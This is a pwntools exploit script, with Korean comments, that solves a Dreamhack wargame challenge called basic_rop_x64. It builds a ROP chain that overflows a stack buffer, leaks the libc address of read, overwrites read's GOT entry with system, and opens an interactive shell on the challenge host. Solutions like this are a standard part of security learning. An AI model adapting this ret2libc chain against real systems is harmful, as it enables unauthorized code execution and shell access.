from pwn import *

context.arch = "amd64"
p = remote('host3.dreamhack.games', 17248)

e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')

payload = b'a'*0x48

# Exploit

read_plt = e.plt['read']       # read_plt = e.symbols['read']와 같음
read_got = e.got['read']       # 여기서는 got 주소만 알 수 있고 got 주소 안의 내용은 알 수 없음
write_plt = e.plt['write']
read_system_offset = libc.symbols['read'] - libc.symbols['system']

# r = ROP(e)
# pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
# pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
# ret = r.find_gadget(['ret'])[0]

pop_rdi = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881
ret = 0x00000000004005a9

payload += p64(ret)            # movaps 때문에 stack을 0x10 단위로 맞추기 위해 삽입

# write(1, read_got, ...)

payload += p64(pop_rdi) + p64(0x1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0x0)
payload += p64(write_plt)

# read(0, read_got, ...)

payload += p64(pop_rdi) + p64(0x0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0x0)
payload += p64(read_plt)

# read('/bin/sh') == system('/bin/sh')

payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(read_plt)

p.send(payload)

p.recvuntil(b'a'*0x40)
read = p.recvn(6)+b'\x00\x00'
system = u64(read) - read_system_offset

p.send(p64(system) + b'/bin/sh\x00')
p.interactive()
